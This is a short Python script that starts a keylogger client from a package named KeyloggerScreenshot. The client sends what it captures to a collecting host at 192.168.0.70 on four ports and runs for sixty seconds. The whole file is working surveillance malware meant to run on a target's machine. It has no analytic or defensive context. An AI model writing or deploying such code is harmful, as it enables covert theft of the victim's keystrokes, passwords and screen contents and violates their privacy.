import KeyloggerScreenshot as ks 

ip = '192.168.0.70'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333, ip, 4444, duration_in_seconds=60)
key_client.start()
